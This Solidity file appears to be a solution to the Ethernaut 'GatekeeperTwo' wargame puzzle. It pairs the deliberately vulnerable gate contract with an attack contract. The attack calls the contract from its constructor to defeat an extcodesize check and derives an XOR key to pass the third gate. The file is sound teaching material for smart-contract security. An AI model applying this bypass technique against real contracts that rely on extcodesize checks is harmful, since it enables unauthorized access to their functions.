// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {

  bool public shouldWork;
  constructor(GatekeeperTwo gate) public {
    gate.enter(xorInverse());
  }

  function xorInverse() public view returns(bytes8) {
    return bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(uint64(0) - 1);
  }

  function check() external view returns(uint64 x, uint64 y, uint64 z, uint64 w) {
    (x, y, z, w) = checkGateThree(bytes8(xorInverse()));
  }

  function checkGateThree(bytes8 _gateKey) public view returns(uint64 x, uint64 y, uint64 z, uint64 w) {
    x = uint64(_gateKey);
    y = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    z = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(_gateKey);
    w = uint64(0) - 1;
  }
}

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "gate one!");
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0, "gate two!");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(
      uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1, 
      "gate three!");
    _;

    // a = uint64(0) - 1
    // b = uint64(_gateKey)
    // c = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))))

    // a = c^b
    // b = c^a

    // bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ a = uint64(0) - 1
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}